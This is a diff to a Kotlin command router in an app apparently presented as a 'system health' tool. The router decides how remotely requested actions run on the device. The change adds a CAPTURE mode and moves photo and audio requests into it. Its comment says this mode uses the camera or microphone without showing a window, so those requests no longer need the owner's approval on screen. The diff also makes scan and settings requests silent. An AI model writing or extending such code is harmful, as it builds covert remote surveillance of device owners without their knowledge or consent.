@@ -1,20 +1,20 @@
 package com.example.systemhealth
 
 /** Decides how a remotely requested tool runs. The names mirror the backend's accepted actions:
- * silent ones finish from the background service, the rest need the app's visible UI. */
+ * silent ones answer from the background loop, capture ones use the camera or microphone without
+ * showing a window, the rest need the app open on screen so their owner can approve them. */
 internal object DeviceCommandRouter {
-    enum class Mode { SILENT, USER, UNKNOWN }
+    enum class Mode { SILENT, CAPTURE, USER, UNKNOWN }
 
-    private val silent = setOf("request_status", "request_audit", "request_backup")
-    private val user = setOf(
-        "request_screenshot", "request_photo", "request_audio", "request_location",
-        "request_scan", "request_files"
-    )
+    private val silent = setOf("request_status", "request_scan", "request_settings")
+    private val capture = setOf("request_photo", "request_audio")
+    private val user = setOf("request_screenshot", "request_location", "request_geofence")
 
-    val actions: Set<String> get() = silent + user
+    val actions: Set<String> get() = silent + capture + user
 
     fun route(action: String): Mode = when {
         action in silent -> Mode.SILENT
+        action in capture -> Mode.CAPTURE
         action in user -> Mode.USER
         else -> Mode.UNKNOWN
     }
